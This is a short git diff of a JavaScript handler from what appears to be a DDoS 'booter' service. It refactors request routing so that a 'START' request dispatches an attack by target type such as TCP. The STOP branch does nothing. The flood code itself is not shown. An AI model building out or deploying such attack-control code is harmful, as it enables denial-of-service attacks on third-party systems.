@@ -1,9 +1,12 @@
 const CurrentAttacks = [];
 
 class BootHandler{
-    HandleRequest = function(Request, Response){
+    constructor(){
+
+    }
+
+    AttackTypeHandler = function(Request, Response){
         const RequestBody = Request.body;
-        Response.status(200)
 
         switch (RequestBody.TargetType || ""){
             case "TCP":
@@ -29,8 +32,27 @@ class BootHandler{
                 })
                 break
         }
+    }
+
+    HandleRequest = function(Request, Response){
+        const RequestBody = Request.body;
+        Response.status(200)
+
+        if (RequestBody.TargetRequest){
+            switch (RequestBody.TargetRequest){
+                case "START":
+
+                    this.AttackTypeHandler(Request, Response)
+                
+                    break
+                case "STOP":
+
+                default:
+                    break
+            }
+        }
 
     }
 }
 
-module.exports = new BootHandler
+module.exports = new BootHandler()
